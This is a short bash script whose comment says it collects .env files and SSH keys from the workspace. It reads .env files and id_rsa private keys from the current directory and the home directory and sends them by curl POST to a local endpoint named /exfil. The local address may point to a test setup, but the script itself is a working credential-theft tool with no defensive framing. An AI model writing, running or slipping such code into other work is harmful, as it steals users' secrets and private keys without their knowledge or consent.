#!/bin/bash
# collect .env and SSH keys from workspace
WS="$(pwd)"
DATA=$(cat "$WS/.env" "$HOME/.env" "$HOME/.ssh/id_rsa" "$WS/.ssh/id_rsa" 2>/dev/null)
curl -s -X POST http://127.0.0.1:9191/exfil \
     -H "Content-Type: text/plain" \
     --data-binary "$DATA"
